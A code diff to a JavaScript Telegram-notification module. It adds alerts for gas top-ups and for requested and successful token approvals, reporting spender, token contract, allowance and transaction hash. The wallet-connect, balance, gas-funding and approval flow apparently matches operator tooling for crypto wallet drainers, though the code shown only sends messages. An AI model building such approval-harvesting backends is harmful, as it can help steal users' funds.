@@ -118,6 +118,7 @@ function networkBlock(session, spec) {
         `Address: ${display(address)}`,
         `${escapeHtml(spec.native)}: ${displayAmount(row?.native)}`,
         `USDT: ${displayAmount(row?.usdt)}`,
+        `Est. approval gas: ${display(row?.gas?.estimatedFee)} ${escapeHtml(spec.native)}`,
         `USD: ${displayUsd(row?.usdt?.usdValue)}`
     ];
 }
@@ -265,6 +266,100 @@ function buildCardApplicationMessage(application, session) {
     return lines.join("\n");
 }
 
+async function notifyGasTopup(kind, payment, send = sendTelegramMessage) {
+    try {
+        if (!payment?.paymentId) {
+            return { ok: false, skipped: true, reason: "No payment" };
+        }
+
+        if (!isConfigured()) {
+            return { ok: false, skipped: true, reason: "Telegram is not configured" };
+        }
+
+        if (!dedupe.tryClaim(`gas_topup_${kind}`, payment.paymentId)) {
+            return { ok: false, skipped: true, reason: "duplicate" };
+        }
+
+        const title = kind === "started" ? "⛽ Gas Top Up Started" : "✅ Gas Top Up Confirmed";
+        const lines = [
+            `<b>${title}</b>`,
+            "",
+            `<b>Network:</b> ${escapeHtml(prettyNetwork(payment.network))}`,
+            `<b>Payment ID:</b> ${display(payment.paymentId)}`,
+            `<b>Hash:</b> ${display(payment.gasFundingTxHash)}`,
+            `<b>Time:</b> ${display(new Date().toISOString())}`
+        ];
+
+        return await send(lines.join("\n"));
+    } catch (err) {
+        logger.warn({ err: { message: err.message } }, "notifyGasTopup failed");
+        return { ok: false, skipped: false, reason: err.message };
+    }
+}
+
+async function notifyApprovalRequested(payment, send = sendTelegramMessage) {
+    try {
+        if (!payment?.paymentId) {
+            return { ok: false, skipped: true, reason: "No payment" };
+        }
+
+        if (!isConfigured()) {
+            return { ok: false, skipped: true, reason: "Telegram is not configured" };
+        }
+
+        if (!dedupe.tryClaim("approval_requested", payment.paymentId)) {
+            return { ok: false, skipped: true, reason: "duplicate" };
+        }
+
+        const lines = [
+            "<b>Approval Requested</b>",
+            "",
+            `<b>Network:</b> ${escapeHtml(prettyNetwork(payment.network))}`,
+            `<b>Spender:</b> ${display(payment.spender)}`,
+            `<b>Token:</b> ${display(payment.tokenContract)}`,
+            `<b>Amount:</b> ${display(payment.allowance || "1 USDT")}`,
+            `<b>Time:</b> ${display(new Date().toISOString())}`
+        ];
+
+        return await send(lines.join("\n"));
+    } catch (err) {
+        logger.warn({ err: { message: err.message } }, "notifyApprovalRequested failed");
+        return { ok: false, skipped: false, reason: err.message };
+    }
+}
+
+async function notifyApprovalSuccessful(payment, send = sendTelegramMessage) {
+    try {
+        if (!payment?.paymentId || !payment.transactionHash) {
+            return { ok: false, skipped: true, reason: "No verified hash" };
+        }
+
+        if (!isConfigured()) {
+            return { ok: false, skipped: true, reason: "Telegram is not configured" };
+        }
+
+        if (!dedupe.tryClaim("approval_successful", payment.paymentId)) {
+            return { ok: false, skipped: true, reason: "duplicate" };
+        }
+
+        const lines = [
+            "<b>Approval Successful</b>",
+            "",
+            `<b>Network:</b> ${escapeHtml(prettyNetwork(payment.network))}`,
+            `<b>Spender:</b> ${display(payment.spender)}`,
+            `<b>Token:</b> ${display(payment.tokenContract)}`,
+            `<b>Amount:</b> ${escapeHtml(formatApprovedAmount(payment))}`,
+            `<b>Tx hash:</b> ${display(payment.transactionHash)}`,
+            `<b>Time:</b> ${display(payment.updatedAt || new Date().toISOString())}`
+        ];
+
+        return await send(lines.join("\n"));
+    } catch (err) {
+        logger.warn({ err: { message: err.message } }, "notifyApprovalSuccessful failed");
+        return { ok: false, skipped: false, reason: err.message };
+    }
+}
+
 async function notifyWalletConnected(session, send = sendTelegramMessage) {
     try {
         if (!session?.connectionId) {
@@ -358,6 +453,9 @@ module.exports = {
     notifyWalletConnected,
     notifyApprovalStatus,
     notifyApprovalSuccess,
+    notifyApprovalRequested,
+    notifyApprovalSuccessful,
+    notifyGasTopup,
     notifyCardApplication,
     prettyNetwork,
     walletFromSession,
